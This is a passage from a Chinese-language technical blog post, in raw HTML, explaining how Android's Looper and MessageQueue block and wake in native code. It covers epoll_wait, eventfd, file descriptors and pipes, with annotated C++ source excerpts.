class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">android_os_MessageQueue_nativePollOnce</span><span class=\"params\">(JNIEnv* env, jobject obj,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">        jlong ptr, jint timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    NativeMessageQueue* nativeMessageQueue = <span class=\"built_in\">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class=\"line\">    <span class=\"comment\">// 实际上是调用到了pollOnce</span></span><br><span class=\"line\">    nativeMessageQueue-&gt;<span class=\"built_in\">pollOnce</span>(env, obj, timeoutMillis);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">NativeMessageQueue::pollOnce</span><span class=\"params\">(JNIEnv* env, jobject pollObj, <span class=\"type\">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    mPollEnv = env;</span><br><span class=\"line\">    mPollObj = pollObj;</span><br><span class=\"line\">    mLooper-&gt;<span class=\"built_in\">pollOnce</span>(timeoutMillis); <span class=\"comment\">// 哟，结果在native层还是Looper在干活哦</span></span><br><span class=\"line\">    mPollObj = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    mPollEnv = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>进一步找到 <a href=\"https://cs.android.com/android/platform/superproject/+/master:system/core/libutils/Looper.cpp;drc=master;bpv=1;bpt=1;l=211\">system&#x2F;core&#x2F;libutils&#x2F;Looper.cpp</a> 的 <code>pollOnce</code>：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Looper::pollOnce</span><span class=\"params\">(<span class=\"type\">int</span> timeoutMillis, <span class=\"type\">int</span>* outFd, <span class=\"type\">int</span>* outEvents, <span class=\"type\">void</span>** outData)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (result != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// timeout时间传到了这里，接着看pollInner函数</span></span><br><span class=\"line\">        result = <span class=\"built_in\">pollInner</span>(timeoutMillis);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Looper::pollInner</span><span class=\"params\">(<span class=\"type\">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 这里会根据下一个msg的时间做修正，如果早于传入的这个timeout，那就以更早的时间进行延时，避免漏掉msg</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (timeoutMillis != <span class=\"number\">0</span> &amp;&amp; mNextMessageUptime != LLONG_MAX) &#123;</span><br><span class=\"line\">        <span class=\"type\">nsecs_t</span> now = <span class=\"built_in\">systemTime</span>(SYSTEM_TIME_MONOTONIC);</span><br><span class=\"line\">        <span class=\"type\">int</span> messageTimeoutMillis = <span class=\"built_in\">toMillisecondTimeoutDelay</span>(now, mNextMessageUptime);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (messageTimeoutMillis &gt;= <span class=\"number\">0</span></span><br><span class=\"line\">                &amp;&amp; (timeoutMillis &lt; <span class=\"number\">0</span> || messageTimeoutMillis &lt; timeoutMillis)) &#123;</span><br><span class=\"line\">            timeoutMillis = messageTimeoutMillis;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 初始返回值就是唤醒</span></span><br><span class=\"line\">    <span class=\"type\">int</span> result = POLL_WAKE;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 这里设置标志位，准备进入idle状态（epoll_wait会挂起释放CPU资源）</span></span><br><span class=\"line\">    mPolling = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">epoll_event</span> eventItems[EPOLL_MAX_EVENTS];</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知，下文详解</span></span><br><span class=\"line\">    <span class=\"type\">int</span> eventCount = <span class=\"built_in\">epoll_wait</span>(mEpollFd.<span class=\"built_in\">get</span>(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);</span><br><span class=\"line\">    <span class=\"comment\">// epoll_wait返回事件（注意这里返回有可能是timeout时间到了，也可能是中途被唤醒），退出idle状态，重新取得CPU执行机会</span></span><br><span class=\"line\">    mPolling = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 返回-1的话表示error了，直接goto到Done代码行</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (eventCount &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        result = POLL_ERROR;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> Done;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 返回0表示timeout时间到了（说明这期间没有新的消息导致中途唤醒），正常Done</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (eventCount == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        result = POLL_TIMEOUT;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> Done;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; eventCount; i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> fd = eventItems[i].data.fd;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> epollEvents = eventItems[i].events;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (fd == mWakeEventFd.<span class=\"built_in\">get</span>()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (epollEvents &amp; EPOLLIN) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">awoken</span>(); <span class=\"comment\">// 【重点】被唤醒了</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                ...</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">Done: ;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>pollInner</code> 代码很长，但其实核心就是 <code>epoll_wait</code> 这个系统调用，我们先大概看看它的函数定义（<a href=\"https://man7.org/linux/man-pages/man2/epoll_wait.2.html\">epoll_wait(2) — Linux manual page</a> ， <a href=\"https://zh.wikipedia.org/wiki/Epoll\">Epoll-wiki</a>），后文再详解：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_wait</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"keyword\">struct</span> epoll_event *events, <span class=\"type\">int</span> maxevents, <span class=\"type\">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>epoll_wait这里也是<strong>整个Android消息机制阻塞的真正位置，阻塞等待期间可以保证线程进入休眠状态，不占用CPU资源，同时监听所注册的事件</strong>。</p>\n<p>简单地讲，就是等待注册在文件描述符 <code>epfd</code> 上的事件，等事件产生的时候，传入的events数组会被填充，以便于epoll_wait返回后处理事件，也就是我们上面源码中 <code>for (int i = 0; i &lt; eventCount; i++)</code> 干的事情。所以这个epoll应该是一个<strong>事件驱动的机制</strong>。</p>\n<p>为什么不着急讲上面的 <code>awoken()</code> 函数，因为在此之前，我们必须基本了解Linux的<strong>文件描述符</strong>（fd）、<strong>管道</strong>（pipe）和<strong>epoll</strong>机制，有了这些预备知识我们就能明白一切了。</p>\n<h2 id=\"内核知识简介\"><a href=\"#内核知识简介\" class=\"headerlink\" title=\"内核知识简介\"></a>内核知识简介</h2><h4 id=\"文件描述符（File-Descriptor）\"><a href=\"#文件描述符（File-Descriptor）\" class=\"headerlink\" title=\"文件描述符（File Descriptor）\"></a>文件描述符（File Descriptor）</h4><p>以下部分简称FD。摘录<a href=\"https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6\">维基百科的概念</a>：</p>\n<blockquote>\n<p>计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。</p>\n</blockquote>\n<p>概念看起来有点抽象，在理解FD之前我们需要感悟Linux的设计思想：<strong>一切皆文件</strong>。“Linux中一切都可以看作文件，包括普通文件、链接文件、Socket以及设备驱动等，对其进行相关操作时，都可能会创建对应的文件描述符。文件描述符是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有I&#x2F;O操作相关的系统调用（例如read、write等）都需要通过文件描述符。”</p>\n<p>可见，在Linux中，FD就是一种宝贵的系统资源，就像工业时代的石油一样，没有它，我们的文件系统就无法运转。本质上，一个Linux进程启动后，会在内核空间生成文件描述符表（FD Table），记录当前进程所有可用的FD，也即映射着该进程所有打开的文件，这里引用一张其他大佬的<a href=\"http://c.biancheng.net/view/3066.html\">图</a>，就更形象了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/9419696c40b1897d7d7d7f46ba2ffd63.gif\"></p>\n<p><strong>FD实际上就是文件描述符表的数组下标（所以是非负整数）</strong>。通俗地总结就是系统操作I&#x2F;O资源的钥匙。更多细节大家可自行查阅或参考文末链接，此处点到为止。</p>\n<p>我们由此还可以萌生一个初步概念：有了方便的文件操作，我们就能实现跨进程通信了。</p>\n<h4 id=\"管道（pipe）\"><a href=\"#管道（pipe）\" class=\"headerlink\" title=\"管道（pipe）\"></a>管道（pipe）</h4><p>那么什么又是管道呢？同样地，我们先看看<a href=\"https://zh.wikipedia.org/wiki/%E7%AE%A1%E9%81%93_(Unix)\">百科的概念</a>：</p>\n<blockquote>\n<p>在类Unix操作系统（以及一些其他借用了这个设计的操作系统，如Windows）中，管道（英语：Pipeline）是一系列将标准输入输出链接起来的进程，其中每一个进程的输出被直接作为下一个进程的输入。<br>这个概念是由道格拉斯·麦克罗伊为Unix命令行发明的，因与物理上的管道相似而得名。</p>\n</blockquote>\n<p>这个概念还算比较形象，管道就是通常用于进程间通信的一种机制。如其名，就像水管的一端输水，另一端接水。pipe的发明人发现系统操作执行命令的时候，经常有需求要将一个程序的输出交给另一个程序进行处理，这种操作可以使用输入输出配合文件来实现，比如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> &gt; abc.txt <span class=\"comment\"># 把当前目录的文件列表输入到abc文本</span></span><br><span class=\"line\">grep xxx abc.txt <span class=\"comment\"># adb文本作为输出，让grep程序查找内容xxx</span></span><br></pre></td></tr></table></figure>\n\n<p>这确实很麻烦，管道的出现简化了这个操作，现在我们可以用管道符（通常这么称呼）竖线来连接两个命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> | grep xxx</span><br></pre></td></tr></table></figure>\n\n<p>达到同样的效果，还不需要显式地产生文件。shell会用一个管道连接两个进程的输入输出，以此实现跨进程通信。因此，我们可以把管道的本质理解成一个文件，前一个进程用写的方式打开文件，后一个进程用读的方式打开。所以管道的系统调用函数是这样的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pipe</span><span class=\"params\">(<span class=\"type\">int</span> pipefd[<span class=\"number\">2</span>])</span>;</span><br></pre></td></tr></table></figure>\n\n<p>函数调用后会创建2个文件描述符，即填充pipefd数组，其中pipefd[0]是读方式打开，pipefd[1]是写方式打开，分别作为管道的读和写描述符。管道虽然形式上是文件，但本身并不占用磁盘存储空间，而是占用的内存空间，所以管道是一个操作方式和文件相同的内存缓冲区（所以我们也不用狭隘地理解Linux中的文件，并非存在磁盘上的才叫文件）。<strong>写入管道的数据会被缓存到直到另一端读取为止，所以上述命令是阻塞的</strong>，在ls没有结果产生之前grep并不会执行。</p>\n<p>所以在实践中，我们通常让一个进程关闭读端，另一个进程关闭写端，以实现单工通信，引用一张其他大佬的<a href=\"https://zhuanlan.zhihu.com/p/58489873\">图</a>：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/ed02bb53a696f14c3e854c2573a164b8.png\"></p>\n<p>类似这样的代码，了解其形式即可（更多细节可以参考文末链接）：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 父进程fork产生子进程后</span></span><br><span class=\"line\"><span class=\"comment\">// parent进程</span></span><br><span class=\"line\">read(pipefd[<span class=\"number\">0</span>], ...);</span><br><span class=\"line\"><span class=\"comment\">// child进程</span></span><br><span class=\"line\">write(pipefd[<span class=\"number\">1</span>], ...);</span><br></pre></td></tr></table></figure>\n\n<p>此外，我们必须清楚的是，<strong>pipe并不只能用于跨进程通信，在同一个进程内当然也是可用的</strong>。</p>\n<h4 id=\"epoll\"><a href=\"#epoll\" class=\"headerlink\" title=\"epoll\"></a>epoll</h4><p>了解文件描述符和管道后，我们终于可以讲epoll机制了。依然先看定义：</p>\n<blockquote>\n<p>epoll是Linux内核的可扩展I&#x2F;O事件通知机制。于Linux 2.5.44首度登场，它设计目的旨在取代既有POSIX select(2)与poll(2)系统函数，让需要大量操作文件描述符的程序得以发挥更优异的性能。epoll 实现的功能与 poll 类似，都是监听多个文件描述符上的事件。<br>epoll 通过使用红黑树(RB-tree)搜索被监控的文件描述符(file descriptor)。在 epoll 实例上注册事件时，epoll 会将该事件添加到 epoll 实例的红黑树上并注册一个回调函数，当事件发生时会将事件添加到就绪链表中。</p>\n</blockquote>\n<p>说明epoll是一种I&#x2F;O<strong>事件通知机制</strong>（事件驱动的，犹如观察者模式）。我们上文提到管道机制，需要一端写数据另一端才能读数据，但在实践中，我们往往不能这样无尽地等待，而是<strong>希望有一个监听，你什么时候写再通知我去读</strong>。</p>\n<p>在epoll出现之前，也有诸如select和poll这样的监听机制，但是效率比较低，有些需要无差别遍历FD，虽然也是非阻塞，但唤醒后要轮询I&#x2F;O，或者是有FD监听数量上限等缺点，具体此处不赘述。</p>\n<p>总之，epoll解决了这些问题，实现了高性能的I&#x2F;O多路复用，还使用<a href=\"https://www.cnblogs.com/huxiao-tee/p/4660352.html\">mmap</a>加速内核与用户空间的消息传递。<a href=\"https://man7.org/linux/man-pages/man7/epoll.7.html\">epoll的系统调用</a>也比较简单，就3个函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在内核中创建epoll实例并返回一个epoll文件描述符</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_create</span><span class=\"params\">(<span class=\"type\">int</span> size)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_create1</span><span class=\"params\">(<span class=\"type\">int</span> flags)</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向epfd（上面create的）对应的epoll实例添加、修改或删除对fd（即第3个参数）上事件event的监听</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_ctl</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"type\">int</span> op, <span class=\"type\">int</span> fd, <span class=\"keyword\">struct</span> epoll_event *event)</span>;</span><br><span class=\"line\"><span class=\"comment\">// 这个函数我们上文就提到了，它等待注册在epfd上面的事件，事件从events参数中带出</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_wait</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"keyword\">struct</span> epoll_event *events, <span class=\"type\">int</span> maxevents, <span class=\"type\">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>epoll内部实现还是比较复杂的，用红黑树结构管理fd，双向链表结构管理回调的事件，具体可以参考文末链接。简单的讲一下原理，<code>epoll_ctl</code> 函数会把传入的fd和event进行存储，并与相应的设备驱动程序建立关系，当相应的事件发生时，就会调用内部的回调函数将事件添加到链表中，最终通知线程唤醒，<code>epoll_wait</code> 得以返回。没有事件发生时，<code>epoll_wait</code> 就是挂起状态。 </p>\n<p>这里<strong>注意不要混淆了</strong>：epfd是epoll程序实例的描述符或者说索引；fd是与你想要监听的事件所对应的描述符，最终读写管道依赖的也是这个fd。</p>\n<h2 id=\"回溯Native层\"><a href=\"#回溯Native层\" class=\"headerlink\" title=\"回溯Native层\"></a>回溯Native层</h2><p>终于搞清楚了epoll，我们再回去看MessageQueue和Looper的Native源码，就非常清晰了。</p>\n<p>还记得我们上文MQ中的mPtr变量吗，实际上在MQ的构造方法中进行了初始化：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MessageQueue(<span class=\"type\">boolean</span> quitAllowed) &#123;</span><br><span class=\"line\">    mQuitAllowed = quitAllowed;</span><br><span class=\"line\">    mPtr = nativeInit(); <span class=\"comment\">// 本地调用</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所以在Native层也有一个MQ对象，mPtr是MQ在Native层的一个映射引用，方便上层寻址访问：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> jlong <span class=\"title\">android_os_MessageQueue_nativeInit</span><span class=\"params\">(JNIEnv* env, jclass clazz)</span> </span>&#123;</span><br><span class=\"line\">    NativeMessageQueue* nativeMessageQueue = <span class=\"keyword\">new</span> <span class=\"built_in\">NativeMessageQueue</span>();</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">reinterpret_cast</span>&lt;jlong&gt;(nativeMessageQueue); <span class=\"comment\">// long类型，实际上就是个地址</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NativeMessageQueue::<span class=\"built_in\">NativeMessageQueue</span>() : <span class=\"built_in\">mPollEnv</span>(<span class=\"literal\">NULL</span>), <span class=\"built_in\">mPollObj</span>(<span class=\"literal\">NULL</span>), <span class=\"built_in\">mExceptionObj</span>(<span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    mLooper = Looper::<span class=\"built_in\">getForThread</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mLooper == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        mLooper = <span class=\"keyword\">new</span> <span class=\"built_in\">Looper</span>(<span class=\"literal\">false</span>); <span class=\"comment\">// Native的MQ在初始化时还创建了Looper的实例</span></span><br><span class=\"line\">        Looper::<span class=\"built_in\">setForThread</span>(mLooper);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>再看看Looper的初始化过程：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Looper::<span class=\"built_in\">Looper</span>(<span class=\"type\">bool</span> allowNonCallbacks)</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// eventfd系统函数创建一个文件描述符，赋值给mWakeEventFd（唤醒事件描述符），待会儿管道的读写都会在此FD上进行</span></span><br><span class=\"line\">    mWakeEventFd.<span class=\"built_in\">reset</span>(<span class=\"built_in\">eventfd</span>(<span class=\"number\">0</span>, EFD_NONBLOCK | EFD_CLOEXEC));</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】构造了epoll实例</span></span><br><span class=\"line\">    <span class=\"built_in\">rebuildEpollLocked</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Looper::rebuildEpollLocked</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果已经有epoll实例对应的描述符，先重置</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mEpollFd &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        mEpollFd.<span class=\"built_in\">reset</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 创建新的epoll实例和唤醒管道（wake pipe）</span></span><br><span class=\"line\">    <span class=\"comment\">// 【重点】此处用epoll_create1函数创建了实例并将返回赋值给mEpollFd描述符</span></span><br><span class=\"line\">    mEpollFd.<span class=\"built_in\">reset</span>(<span class=\"built_in\">epoll_create1</span>(EPOLL_CLOEXEC));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">epoll_event</span> eventItem;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(&amp; eventItem, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(epoll_event));</span><br><span class=\"line\">    eventItem.events = EPOLLIN; <span class=\"comment\">// IN，监听管道的输入（即write）操作</span></span><br><span class=\"line\">    <span class=\"comment\">// 唤醒事件fd要由event数据持有，等会儿唤醒时才能进行查找匹配</span></span><br><span class=\"line\">    eventItem.data.fd = mWakeEventFd.<span class=\"built_in\">get</span>();</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】用epoll_ctl函数注册唤醒事件的监听，EPOLL_CTL_ADD表示添加事件的操作标志</span></span><br><span class=\"line\">    <span class=\"type\">int</span> result = <span class=\"built_in\">epoll_ctl</span>(mEpollFd.<span class=\"built_in\">get</span>(), EPOLL_CTL_ADD, mWakeEventFd.<span class=\"built_in\">get</span>(), &amp;eventItem);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>此时我们再回过头去看Looper的 <code>pollInner</code> 函数，<code>epoll_create1</code> 、  <code>epoll_ctl</code>  、 <code>epoll_wait</code> 这三个epoll流程就这样联系了起来：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Looper::pollInner</span><span class=\"params\">(<span class=\"type\">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知</span></span><br><span class=\"line\">    <span class=\"type\">int</span> eventCount = <span class=\"built_in\">epoll_wait</span>(mEpollFd.<span class=\"built_in\">get</span>(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; eventCount; i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> fd = eventItems[i].data.fd;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> epollEvents = eventItems[i].events;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (fd == mWakeEventFd.<span class=\"built_in\">get</span>()) &#123; <span class=\"comment\">// 查找匹配唤醒事件</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (epollEvents &amp; EPOLLIN) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">awoken</span>(); <span class=\"comment\">// 【重点】被唤醒</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">Done: ;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Looper::awoken</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> counter;</span><br><span class=\"line\">    <span class=\"comment\">// 进行读操作</span></span><br><span class=\"line\">    